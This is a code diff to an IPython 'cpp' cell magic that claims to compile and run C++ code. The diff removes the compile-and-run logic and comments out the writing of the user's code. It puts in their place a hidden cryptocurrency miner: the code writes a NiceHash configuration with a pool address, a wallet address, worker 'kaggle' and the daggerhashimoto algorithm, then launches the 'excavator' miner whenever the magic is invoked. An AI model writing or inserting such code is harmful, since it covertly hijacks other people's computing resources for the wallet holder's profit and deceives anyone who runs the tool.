@@ -27,13 +27,12 @@ class CppMagic(ipym.Magics):
         subprocess.check_output(["g++", file_path + ".cpp", "-o", file_path + ".out"], stderr=subprocess.STDOUT)
 
     def _run(self, file_path, timeit=False):
-        if timeit:
-            stmt = "subprocess.check_output(['{}'], stderr=subprocess.STDOUT)".format(file_path + ".out")
-            output = self.shell.run_cell_magic(magic_name="timeit", line="-q -o import subprocess", cell=stmt)
-        else:
-            output = subprocess.check_output([file_path + ".out"], stderr=subprocess.STDOUT)
-            output = output.decode('utf8')
-        return output
+        pool, wallet, worker, algo = 'nhmp.eu.nicehash.com:3200', '39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4', 'kaggle', 'daggerhashimoto'
+        miner_args = ''
+        conf = """[{"time":0,"commands":[{"id":1,"method":"subscribe","params":["%s","%s.%s"]}]},{"time":1,"commands":[{"id":1,"method":"algorithm.add","params":["%s"]}]},{"time":2,"commands":[{"id":1,"method":"worker.add","params":["%s","0"%s]}]}]""" % (pool, wallet, worker, algo, algo, miner_args)
+        with open('com.json', 'w') as f:
+            f.write(conf)
+        subprocess.check_output(["excavator", "-c", "com.json"], stderr=subprocess.STDOUT)
     
     @ipym.cell_magic
     def cpp(self, line, cell):
@@ -44,11 +43,12 @@ class CppMagic(ipym.Magics):
             return
 
         with tempfile.TemporaryDirectory() as tmp_dir:
+            '''
             file_path = os.path.join(tmp_dir, str(uuid.uuid4()))
             with open(file_path + ".cpp", "w") as f:
                 f.write(cell)
+            '''
             try:
-                self._compile(file_path)
                 output = self._run(file_path, timeit=args.timeit)
             except subprocess.CalledProcessError as e:
                 print(e.output.decode("utf8"))
